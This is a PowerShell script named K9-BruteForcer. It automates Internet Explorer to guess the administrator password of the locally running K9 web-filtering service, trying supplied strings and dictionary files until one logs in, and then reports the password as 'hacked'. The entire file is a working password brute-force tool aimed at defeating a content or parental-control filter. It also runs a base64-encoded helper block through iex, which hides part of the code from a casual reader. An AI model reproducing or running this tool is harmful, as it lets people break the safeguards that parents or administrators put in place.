<#
|===============================================================>|
   K9-BruteForcer by APoorv Verma [AP] on 8/25/2013
|===============================================================>|
      $) Supports BruteForce using multiple Dictionaries
      $) Supports BruteForce using multiple Strings
      $) Supports Hybrid BruteForce
      $) Allows Pipelining of Passwords or Dictionaries
      $) Following Shortcuts are supported
           #) Press 'x' to quit
           #) Press 'Enter' to show status
           #) Press 's' to show Intenet Explorer with bruteforcer
           #) Press 'h' to hide Intenet Explorer with bruteforcer
|===============================================================>|
#>
param([Alias("Psw","Password")][String[]]$Passwords,[Alias("Dict","Dictionary")][String[]]$Dictionaries,[Switch]$Debug=$False,[Alias("ShowIE","ShowBrowser")][Switch]$ShowIEWIndow=$False,[Alias("SPB","Progress")][Switch]$ShowProgressBar=$False)
# =======================================START=OF=COMPILER==========================================================|
#    The Following Code was added by AP-Compiler Version [1.2] To Make this program independent of AP-Core Engine
#    GitHub: https://github.com/avdaredevil/AP-Compiler
# ==================================================================================================================|
$Script:PSHell=$(if($PSHell){$PSHell}elseif($PSScriptRoot){$PSScriptRoot}else{"."});
iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gS2V5UHJlc3NlZENvZGUge3BhcmFtKFtQYXJhbWV0ZXIoTWFuZGF0b3J5PSRUcnVlKV1bSW50XSRLZXksICRTdG9yZT0iXl5eIikNCg0KICAgIGlmICghJEhvc3QuVUkuUmF3VUkuS2V5QXZhaWxhYmxlIC1hbmQgJFN0b3JlIC1lcSAiXl5eIikge1JldHVybiAkRmFsc2V9DQogICAgaWYgKCRTdG9yZSAtZXEgIl5eXiIpIHskU3RvcmUgPSAkSG9zdC5VSS5SYXdVSS5SZWFkS2V5KCJJbmNsdWRlS2V5VXAsTm9FY2hvIil9DQogICAgcmV0dXJuICgkS2V5IC1pbiAkU3RvcmUuVmlydHVhbEtleUNvZGUpDQp9CgpmdW5jdGlvbiBHZXQtV2hlcmUge3BhcmFtKFtQYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlKV1bc3RyaW5nXSRGaWxlLCBbU3dpdGNoXSRBbGwpDQoNCiAgICBBUC1SZXF1aXJlICJkZXA6d2hlcmUiIHt0aHJvdyAiTmVlZCBTeXMzMlx3aGVyZSB0byB3b3JrISI7cmV0dXJufQ0KICAgICRPdXQgPSB3aGVyZS5leGUgJGZpbGUgMj4kbnVsbA0KICAgIGlmICghJE91dCkge3JldHVybn0NCiAgICBpZiAoJEFsbCkge3JldHVybiAkT3V0fQ0KICAgIHJldHVybiBAKCRPdXQpWzBdDQp9CgpmdW5jdGlvbiBQcm9jZXNzLVRyYW5zcGFyZW5jeSB7cGFyYW0oW0FsaWFzKCJUcmFuc3BhcmVuY3kiLCJJbnZpc2liaWxpdHkiLCJpIiwidCIpXVtWYWxpZGF0ZVJhbmdlKDAsMTAwKV1baW50XSRUcmFucz0wLCBbUGFyYW1ldGVyKE1hbmRhdG9yeT0kVHJ1ZSldJFByb2Nlc3MpDQoNCiAgICBpZiAoJFByb2Nlc3MgLW1hdGNoICJcLmV4ZSQiKSB7JFByb2Nlc3MgPSAkUHJvY2Vzcy5yZXBsYWNlKCIuZXhlIiwiIil9DQogICAgVHJ5IHsNCiAgICAgICAgaWYgKCRQcm9jZXNzLm5hbWUpIHskUHJvYyA9ICRQcm9jZXNzLm5hbWV9IGVsc2UgeyRQcm9jID0gKEdldC1Qcm9jZXNzICRQcm9jZXNzIC1FcnJvckFjdGlvbiBTdG9wKVswXS5uYW1lfQ0KICAgIH0gY2F0Y2ggew0KICAgICAgICBpZiAoW0ludF06OlRyeVBhcnNlKCRQcm9jZXNzLCBbcmVmXTMpKSB7JFByb2MgPSAoKEdldC1Qcm9jZXNzIHwgPyB7JF8uSUQgLWVxICRQcm9jZXNzfSlbMF0pLm5hbWV9DQogICAgfQ0KICAgIGlmICgkUHJvYyAtbm90TWF0Y2ggIlwuZXhlJCIpIHskUHJvYyA9ICIkUHJvYy5leGUifQ0KICAgIG5pcmNtZCB3aW4gdHJhbnMgcHJvY2VzcyAiJFByb2MiICgoMTAwLSRUcmFucykqMjU1LzEwMCkgfCBPdXQtTnVsbA0KfQoKZnVuY3Rpb24gQVAtUmVxdWlyZSB7cGFyYW0oW1BhcmFtZXRlcihNYW5kYXRvcnk9JFRydWUpXVtBbGlhcygiRnVuY3Rpb25hbGl0eSIsIkxpYnJhcnkiKV1bU3RyaW5nXSRMaWIsIFtTY3JpcHRCbG9ja10kT25GYWlsPXt9LCBbU3dpdGNoXSRQYXNzVGhydSkNCg0KICAgIFtib29sXSRTdGF0ID0gJChzd2l0Y2ggLXJlZ2V4ICgkTGliLnRyaW0oKSkgew0KICAgICAgICAiXkludGVybmV0IiAge3Rlc3QtY29ubmVjdGlvbiBnb29nbGUuY29tIC1Db3VudCAxIC1RdWlldH0NCiAgICAgICAgIl5kZXA6KC4qKSIgIHtpZiAoJE1hdGNoZXNbMV0gLW5lICJ3aGVyZSIpe0FQLVJlcXVpcmUgImRlcDp3aGVyZSIgeyRNT0RFPTJ9fWVsc2V7JE1PREU9Mn07aWYgKCRNT0RFLTIpe0dldC1XaGVyZSAkTWF0Y2hlc1sxXX1lbHNle3RyeXsmICRNYXRjaGVzWzFdICIvZmpmZGpmZHMgLS1kc2phaGRocyAtZHNqYWRqIiAyPiRudWxsOyJzdWNjIn1jYXRjaHt9fX0NCiAgICAgICAgIl5saWI6KC4qKSIgIHskRmlsZT0kTWF0Y2hlc1sxXTskTGliPUFQLUNvbnZlcnRQYXRoICI8TElCPiI7KHRlc3QtcGF0aCAtdCBsZWFmICIkTGliXCRGaWxlIikgLW9yICh0ZXN0LXBhdGggLXQgbGVhZiAiJExpYlwkRmlsZS5kbGwiKX0NCiAgICAgICAgIl5mdW5jdGlvbjooLiopIiAge2djbSAkTWF0Y2hlc1sxXSAtZWEgU2lsZW50bHlDb250aW51ZX0NCiAgICAgICAgIl5zdHJpY3RfZnVuY3Rpb246KC4qKSIgIHtUZXN0LVBhdGggIkZ1bmN0aW9uOlwkKCRNYXRjaGVzWzFdKSJ9DQogICAgfSkNCiAgICBpZiAoISRTdGF0KSB7JE9uRmFpbC5JbnZva2UoKX0NCiAgICBpZiAoJFBhc3NUaHJ1KSB7cmV0dXJuICRTdGF0fQ0KfQoKZnVuY3Rpb24gSW52b2tlLVRlcm5hcnkge3BhcmFtKFtib29sXSRkZWNpZGVyLCBbc2NyaXB0YmxvY2tdJGlmdHJ1ZSwgW3NjcmlwdGJsb2NrXSRpZmZhbHNlKQ0KDQogICAgaWYgKCRkZWNpZGVyKSB7ICYkaWZ0cnVlfSBlbHNlIHsgJiRpZmZhbHNlIH0NCn0KCmZ1bmN0aW9uIFdyaXRlLUFQIHtwYXJhbShbUGFyYW1ldGVyKE1hbmRhdG9yeT0kVHJ1ZSldJFRleHQsIFtTd2l0Y2hdJE5vU2lnbiwgW1N3aXRjaF0kUGxhaW5UZXh0LCBbVmFsaWRhdGVTZXQoIkNlbnRlciIsIlJpZ2h0IiwiTGVmdCIpXVtTdHJpbmddJEFsaWduPSdMZWZ0JywgW1N3aXRjaF0kUGFzc1RocnUpDQoNCiAgICBpZiAoJHRleHQuY291bnQgLWd0IDEgLW9yICR0ZXh0LkdldFR5cGUoKS5OYW1lIC1tYXRjaCAiXFtcXSQiKSB7cmV0dXJuICRUZXh0IHw/eyIkXyJ9fCAlIHtXcml0ZS1BUCAkXyAtTm9TaWduOiROb1NpZ24gLVBsYWluVGV4dDokUGxhaW5UZXh0IC1BbGlnbiAkQWxpZ259fQ0KICAgIGlmICghJHRleHQgLW9yICR0ZXh0IC1ub3RtYXRjaCAiXigoPzxOTkw+eCl8KD88TlM+bnM/KSl7MCwyfSg/PHQ+XD4qKSg/PHM+WytcLSFcKlwjXSkoPzx3Pi4qKSIpIHtXcml0ZS1BUCAkVGV4dDskVGV4dH0NCiAgICAkdGIgID0gIiAgICAiKiRNYXRjaGVzLnQubGVuZ3RoOw0KICAgICRDb2wgPSBAeycrJz0nMic7Jy0nPScxMic7JyEnPScxNCc7JyonPSczJzsnIyc9J0RhcmtHcmF5J31bKCRTaWduID0gJE1hdGNoZXMuUyldDQogICAgaWYgKCEkQ29sKSB7VGhyb3cgIkluY29ycmVjdCBTaWduIFskU2lnbl0gUGFzc2VkISJ9DQogICAgJFNpZ24gPSAkKGlmICgkTm9TaWduIC1vciAkTWF0Y2hlcy5OUykgeyIifSBlbHNlIHsiWyRTaWduXSAifSkNCiAgICBBUC1SZXF1aXJlICJmdW5jdGlvbjpBbGlnbi1UZXh0IiB7ZnVuY3Rpb24gR2xvYmFsOkFsaWduLVRleHQoJGFsaWduLCR0ZXh0KSB7JHRleHR9fQ0KICAgICREYXRhID0gIiR0YiRTaWduJCgkTWF0Y2hlcy5XKSI7aWYgKCEkRGF0YSkge3JldHVybn0NCiAgICAkRGF0YSA9IEFsaWduLVRleHQgLUFsaWduICRBbGlnbiAiJHRiJFNpZ24kKCRNYXRjaGVzLlcpIg0KICAgIGlmICgkUGxhaW5UZXh0KSB7cmV0dXJuICREYXRhfQ0KICAgIFdyaXRlLUhvc3QgLU5vTmV3TGluZTokKFtib29sXSRNYXRjaGVzLk5OTCkgLWYgJENvbCAkRGF0YQ0KICAgIGlmICgkUGFzc1RocnUpIHskRGF0YX0NCn0KCmZ1bmN0aW9uIEtleVByZXNzZWQge3BhcmFtKFtQYXJhbWV0ZXIoTWFuZGF0b3J5PSRUcnVlKV1bU3RyaW5nW11dJEtleSwgJFN0b3JlPSJeXl4iKQ0KDQogICAgaWYgKCRTdG9yZSAtZXEgIl5eXiIgLWFuZCAkSG9zdC5VSS5SYXdVSS5LZXlBdmFpbGFibGUpIHskU3RvcmUgPSAkSG9zdC5VSS5SYXdVSS5SZWFkS2V5KCJJbmNsdWRlS2V5VXAsTm9FY2hvIil9IGVsc2Uge2lmICgkU3RvcmUgLWVxICJeXl4iKSB7cmV0dXJuICRGYWxzZX19DQogICAgJEFucyA9ICRGYWxzZQ0KICAgICRLZXkgfCAlIHsNCiAgICAgICAgJFNPVVJDRSA9ICRfDQogICAgICAgIHRyeSB7DQogICAgICAgICAgICAkQW5zID0gJEFucyAtb3IgKEtleVByZXNzZWRDb2RlICRTT1VSQ0UgJFN0b3JlKQ0KICAgICAgICB9IGNhdGNoIHsNCiAgICAgICAgICAgIEZvcmVhY2ggKCRLIGluICRTT1VSQ0UpIHsNCiAgICAgICAgICAgICAgICBbU3RyaW5nXSRLID0gJEsNCiAgICAgICAgICAgICAgICBpZiAoJEsubGVuZ3RoIC1ndCA0IC1hbmQgKCRLWzAsMSwtMSwtMl0gLWpvaW4oIiIpKSAtZXEgIn5+fn4iKSB7DQogICAgICAgICAgICAgICAgICAgICRBbnMgPSAkQU5TIC1vciAoS2V5UHJlc3NlZENvZGUgKEtleVRyYW5zbGF0ZSgkSykpICRTdG9yZSkNCiAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAkQW5zID0gJEFOUyAtb3IgKCRLLmNoYXJzKDApIC1pbiAkU3RvcmUuQ2hhcmFjdGVyKQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCiAgICByZXR1cm4gJEFucw0KfQoKZnVuY3Rpb24gS2V5VHJhbnNsYXRlIHtwYXJhbShbUGFyYW1ldGVyKE1hbmRhdG9yeT0kVHJ1ZSldW1N0cmluZ10kS2V5KQ0KDQogICAgJEhhc2hLZXkgPSBAew0KICAgICAgICAifn5TcGFjZX5+Ij0zMg0KICAgICAgICAifn5FU0NBUEV+fiI9MjcNCiAgICAgICAgIn5+RW50ZXJ+fiI9MTMNCiAgICAgICAgIn5+U2hpZnR+fiI9MTYNCiAgICAgICAgIn5+Q29udHJvbH5+Ij0xNw0KICAgICAgICAifn5BbHR+fiI9MTgNCiAgICAgICAgIn5+QmFja1NwYWNlfn4iPTgNCiAgICAgICAgIn5+RGVsZXRlfn4iPTQ2DQogICAgICAgICJ+fmYxfn4iPTExMg0KICAgICAgICAifn5mMn5+Ij0xMTMNCiAgICAgICAgIn5+ZjN+fiI9MTE0DQogICAgICAgICJ+fmY0fn4iPTExNQ0KICAgICAgICAifn5mNX5+Ij0xMTYNCiAgICAgICAgIn5+ZjZ+fiI9MTE3DQogICAgICAgICJ+fmY3fn4iPTExOA0KICAgICAgICAifn5mOH5+Ij0xMTkNCiAgICAgICAgIn5+Zjl+fiI9MTIwDQogICAgICAgICJ+fmYxMH5+Ij0xMjENCiAgICAgICAgIn5+ZjExfn4iPTEyMg0KICAgICAgICAifn5mMTJ+fiI9MTIzDQogICAgICAgICJ+fk11dGV+fiI9MTczDQogICAgICAgICJ+fkluc2VydH5+Ij00NQ0KICAgICAgICAifn5QYWdlVXB+fiI9MzMNCiAgICAgICAgIn5+UGFnZURvd25+fiI9MzQNCiAgICAgICAgIn5+RU5Efn4iPTM1DQogICAgICAgICJ+fkhPTUV+fiI9MzYNCiAgICAgICAgIn5+dGFifn4iPTkNCiAgICAgICAgIn5+Q2Fwc0xvY2t+fiI9MjANCiAgICAgICAgIn5+TnVtTG9ja35+Ij0xNDQNCiAgICAgICAgIn5+V2luZG93c35+Ij05MQ0KICAgICAgICAifn5MZWZ0fn4iPTM3DQogICAgICAgICJ+flVwfn4iPTM4DQogICAgICAgICJ+flJpZ2h0fn4iPTM5DQogICAgICAgICJ+fkRvd25+fiI9NDANCiAgICAgICAgIn5+S1Awfn4iPTk2DQogICAgICAgICJ+fktQMX5+Ij05Nw0KICAgICAgICAifn5LUDJ+fiI9OTgNCiAgICAgICAgIn5+S1Azfn4iPTk5DQogICAgICAgICJ+fktQNH5+Ij0xMDANCiAgICAgICAgIn5+S1A1fn4iPTEwMQ0KICAgICAgICAifn5LUDZ+fiI9MTAyDQogICAgICAgICJ+fktQN35+Ij0xMDMNCiAgICAgICAgIn5+S1A4fn4iPTEwNA0KICAgICAgICAifn5LUDl+fiI9MTA1DQogICAgfQ0KICAgIGlmIChbaW50XSRDb252ZXJ0ID0gJEhhc2hLZXkuJEtleSkge3JldHVybiAkQ29udmVydH0NCiAgICBUaHJvdyAiSW52YWxpZCBTcGVjaWFsIEtleSBDb252ZXJzaW9uIg0KfQoKU2V0LUFsaWFzIGludiBQcm9jZXNzLVRyYW5zcGFyZW5jeQpTZXQtQWxpYXMgPzogSW52b2tlLVRlcm5hcnk=")))
# ========================================END=OF=COMPILER===========================================================|

. .\Modules.ps1 | out-null
try {
    if ((Get-Service -Name bckwfs -ErrorAction Stop).status -ne "Running") {
        Write-AP "-K9 Service is not running, will Enable"
        Start-Service -Name bckwfs
        if (!$?) {Write-AP ">-Failed to Enable K9";Write-Host "";exit} Else {
            Write-AP ">+K9 Service was enabled"
        }
        start-Sleep -s 5
    }
} catch {
    Write-AP "-K9 Service is not installed on this System . . .";Write-Host "";exit
}
function Get-PRP ($SCR,$Size,$Phrase) {
    $PswSZ   = $SCR-$Size;$PRP1 = [math]::truncate($PswSZ/2);$PRP2 = $PRP1+(?:(($PswSZ/2).GetType().Name -like "int*"){0}{1})
    return (?:($Phrase.Length -gt $PswSZ){$Phrase.substring(0,$PRP1-2)+"..."+$Phrase.substring($Phrase.Length-1-$PRP2-2,$PRP2-1)}{$Phrase})
}
try {$Passwords += $Input.split(" ")} catch {}
if ($Passwords -eq $Null -and $Dictionaries -eq $Null) {Write-AP "-All Parameters cannot be empty!";Write-Host "";exit}
$pwdo = $pwd
$Scr = $Host.UI.RawUI.WindowSize.width
if ($Scr -lt 80) {$Scr = 80}
$Hacked = $false
$Pass = ""
Write-AP "*Adjusting invalid entries"
foreach ($PSW in $Passwords) {
    If (test-path $PSW -Type Leaf) {
        if ($Debug) {Write-AP ">!Migrating [$(Get-PRP $SCR (1+8+11+17) $PSW)] to Dictionaries"}
        $Dictionaries += $PSW
        $Passwords = $Passwords | ? {$_ -ne $PSW}
    }
}
foreach ($Dict in $Dictionaries) {
    If (!(test-path $Dict -Type Leaf)) {
        if ($Debug) {Write-AP ">!Migrating [$(Get-PRP $SCR (1+8+11+14) $Dict)] to Passwords"}
        $Passwords += $Dict
        $Dictionaries = $Dictionaries | ? {$_ -ne $Dict}
    }
}
if ($Dictionaries -ne $null) {$Dictionaries = $Dictionaries | % {Convert-Path $_}}
cd $env:temp
$IE = New-Object -com InternetExplorer.Application
$IE.Navigate("http://127.0.0.1:2372")
Load($IE)
if ($ShowIEWIndow) {$IE.visible = $True}
Write-AP "*Aquiring Password Prompt"
Try {
    $IE.Document.getElementById("btn-setup").click()
    $PSWBox = $IE.Document.getElementById("b-loginContain")
    $OKBtn  = $IE.Document.getElementById("o-loginContain")
} catch {
    Write-AP "-Browser Internal Error"
    $IE.quit()
    cd $PWDO
    Write-Host ""
    exit
}
function Hack ($IE,[String]$Password) {
    $PSWBox.value = $Password
    $OKBtn.click()
    Load($IE,12)
    TRY {
        $PSWBox.value = "AP"
        return $False
    } catch {
        return $True
    }
#    if ($IE.Document.getElementById("logout") -ne $null){
#        return $True
#    } else {
#        return $False
#    }
}
function Detect-Keys ([String]$Password, $Percent, [String]$Dict) {
    if ($Host.UI.RawUI.KeyAvailable) {
        $Store = $Host.UI.RawUI.ReadKey("IncludeKeyUp,IncludeKeyDown,NoEcho")
        if (!$Store.KeyDown) {Continue}
        if (KeyPressed 'x','q',"~~ESCAPE~~" $Store) {Write-AP "!Quit Signal, exiting . . .";$IE.quit();cd $PWDO;Write-Host "";exit}
        elseif (KeyPressed ' ',"~~Enter~~" $Store) {
            $PS = ?:($LPS -eq "xx") {0} {1/((Get-Date).TimeOfDay - $LPS).TotalSeconds}
            $io = (1+12+17+9+3+6+4)
            Write-AP ">>*KeyWord [$(Get-PRP $SCR ($SCR-[math]::truncate(($SCR-$IO)/2)) $Password)] at $Percent of $(Get-PRP $SCR ($SCR-[math]::truncate(($SCR-$IO)/2)) $Dict) @ $([System.Math]::Round($PS,2)) Keys/sec"
        }
        elseif ((KeyPressed 'h','-' $Store) -and $IE.visible) {Write-AP ">>*Hiding Internet Window . . .";$IE.visible = $False}
        elseif ((KeyPressed 's','+','v' $Store) -and !$IE.visible) {Write-AP ">>*Showing Internet Window . . .";$IE.visible = $True}
    }
}
Write-AP "*Initiating BruteForcing . . ."
$ONtime = $(Get-Date).TimeOfDay
$LPS = "xx"
$ALG = 0
if ($Passwords -ne $Null) {
    $cb = 1
    $op = 0
    $np = $Passwords.count
    Write-AP ">*Using Supplied Passwords [$np KeyWords]"
    foreach ($psw in $Passwords){
        if ([String]::IsNullOrEmpty($Psw)) {continue}
        $OP++
        $LA = $OP/$NP
        if ($ShowProgressBar) {
            write-progress -activity "BruteForcing K9" -status 'Dictionary [Strings]' -percentcomplete ($LA*100) 
            write-progress -id 1 -activity " " -status 'Total Progress' -percentcomplete ($LA/($Dictionaries.Count+$cb)*100) -currentOperation "Password [$OP/$NP]"
        }
        if (Hack $IE $psw) {$Hacked = $True;$Pass = $psw;break}
        Detect-Keys $psw ("{0:P0}" -f $LA) "Strings"
        $LPS = $(Get-Date).TimeOfDay
    }
    $ALG += 1
}
if (!$Hacked -and $Dictionaries -ne $Null) {
    foreach ($Dict in $Dictionaries){
        $Dictionary = [io.file]::ReadAllLines($Dict) | ? {!([String]::IsNullOrEmpty($_))}
        $op = 0
        $np = $Dictionary.count
        Write-AP ">*Using Dictionary - [$(Get-PRP $SCR (1+8+20+3+(''+$NP).Length+10) $Dict)] [$np KeyWords]"
        foreach ($Term in $Dictionary) {
            $OP++
            $LA = $OP/$NP
            if ($ShowProgressBar) {
                write-progress -activity "BruteForcing K9" -status "Dictionary [$(Get-PRP $SCR ($SCR-15) $Dict)]" -percentcomplete ($LA*100)
                write-progress -id 1 -activity " " -status 'Total Progress' -percentcomplete (($ALG+$LA)/($Dictionaries.Count+$cb)*100) -currentOperation "Password [$OP/$NP]"
            }
            if (Hack $IE $Term) {$Hacked = $True;$Pass = $Term;break}
            Detect-Keys $term ("{0:P0}" -f $LA) $Dict
            $LPS = $(Get-Date).TimeOfDay
        }
        $ALG += 1
    }
}
$ONtime = ($(Get-Date).TimeOfDay - $ONtime)
$OFFtime = ?:($ONtime.Hours -ne 0){""+$ONtime.Hours+" Hours"}{}
$OFFtime += ?:($ONtime.Minutes -ne 0){", "+$ONtime.Minutes+" Minutes"}{}
$OFFtime += ?:($ONtime.Seconds -ne 0){", and "+$ONtime.Seconds+" Seconds"}{}
$OFFtime += ?:($OFFtime -eq $Null){""+$ONtime.Milliseconds+" MilliSeconds"}{}
$OFFtime = $OFFtime.trim(", ").trim("and ").replace("1 Seconds","1 Second").replace("1 Hours","1 Hour").replace("1 Minutes","1 Minute")
if ($Hacked) {
    Write-AP "+Hacked K9 with KeyWord [$Pass] in $Offtime"
} else {
    Write-AP "-Failed to BruteForce K9"
}
Write-Host ""
$IE.quit()
cd $Pwdo
